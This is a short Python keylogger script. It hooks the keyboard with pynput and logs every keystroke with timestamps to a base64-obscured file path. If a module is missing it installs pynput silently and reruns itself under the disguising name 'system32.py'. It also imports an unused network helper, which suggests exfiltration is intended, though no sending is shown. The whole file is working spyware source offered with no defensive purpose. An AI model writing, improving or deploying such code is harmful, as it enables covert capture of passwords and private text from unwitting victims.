try:
	import os
	from pynput.keyboard import Key, Listener
	from threading import Thread
	from request import _net
	import logging
	import base64
except ModuleNotFoundError:
	print('an error has occured')
	#Process to install pynput.keyboard module
	os.system('pip3 install pynput')
	#Rerun
	os.system('python3 system32.py')


def preload():
	_dir = 'x64/'+str(base64.b64encode(b'data.enc'))
	logging.basicConfig(filename=_dir, level=logging.DEBUG, format='%(asctime)s : %(message)s')
	with Listener(on_press=on_press) as listener:
		listener.join()
def on_press( key ):
	logging.info( str( key ))


if __name__ =='__main__':
	preload()